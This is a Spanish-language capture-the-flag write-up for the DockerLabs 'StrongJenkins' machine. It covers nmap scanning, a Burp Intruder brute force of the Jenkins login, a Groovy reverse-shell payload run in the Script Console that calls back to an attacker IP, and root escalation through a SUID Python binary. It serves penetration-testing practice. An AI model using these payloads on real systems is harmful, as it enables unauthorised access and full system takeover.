# Máquina StrongJenkins


Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada al puerto 22 y 80:

```shell
nmap -sCV -p8080 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 10.0.20
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.20)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos Jetty que es un servidor http, la versión, y vemos un archivo **robots.txt**. Le echamos un vistazo pero no tiene nada interesante.

--------------
## Explotación

Tras aplicar **fuzzing** y no encontrar nada interesante, nos disponemos a aplicar **Fuerza bruta** sobre el panel de login de la web.

![Pasted image 20240418152153](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/7e7f5e03-15a7-4650-bea0-00dd9fe95bae)

Interceptamos una petición de **login** con **burpsuite** y la remitimos al **intruder** con el que realizaremos el ataque. En el apartado de **payloads** cargamos el famoso **rockyou**. Indicaremos la posición del **payload** en la **request** que tramitamos, en este caso, en el valor que se le asigna a "**j_password**", que corresponde al campo de la contraseña.

Y para diferenciar si el login ha sido exitoso o no, he escogido un valor que se devuelve en la propia **url** cuando el login ha sido erróneo. He supuesto que cuando el login sea exitoso, este cambiará o directamente no aparecerá. Añadiremos este campo, como output en las respuestas del **intruder** creando una nueva **regex** en el apartado "**Grep -Extract**" del intruder, y seleccionando el "**loginError**"

![Pasted image 20240417200914](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/ea017b5a-761b-4292-9d1a-1cb372427833)

En la siguiente captura podemos observar que una de las líneas, no devuelve el campo "**loginError**". 

![Pasted image 20240417200843](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/b1aaf8ed-55df-49a6-8d8b-b8ac0c2d8905)

Probamos la contraseña, y efectivamente "**rockyou**" es la contraseña correspondiente al usuario **admin** ya que logramos acceder con estas credenciales al panel de administrador.

En el apartado "**Manage Jenkins**", podemos irnos al apartado de "**Script Console**":

![Pasted image 20240418152555](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/4267497d-9c32-4c7b-bbf9-71066ca1b10d)

Donde introduciremos el siguiente **payload** que nos enviará una **reverse shell** a nuestra máquina atacante con **IP** 192.168.1.40 por el **puerto** 443 (para la cual, habrá que ponerse en escucha anteriormente por ejemplo con **netcat** -> "**sudo nc -nlvp 443**"):

```js
String host="192.168.1.40";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Le damos a **Run** y estamos dentro de la máquina !


---------------
### Tratamiento de la tty

-------------

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------
## Escalada de privilegios

Filtramos por binarios con permisos **SUID** para ver si podemos ejecutar algo como **root**.

```shell
find / -perm -4000 2>/dev/null
---------------------------------
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/python3.10
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Vemos **/usr/bin/python3.10**, este es crítico y podemos abusar de él.
Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

Ejecutamos el siguiente comando como **root**:

```shell
/usr/bin/python3.10 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```shell
whoami
---------------
root
```

Hemos alcanzado el nivel de privilegios máximo en la máquina !

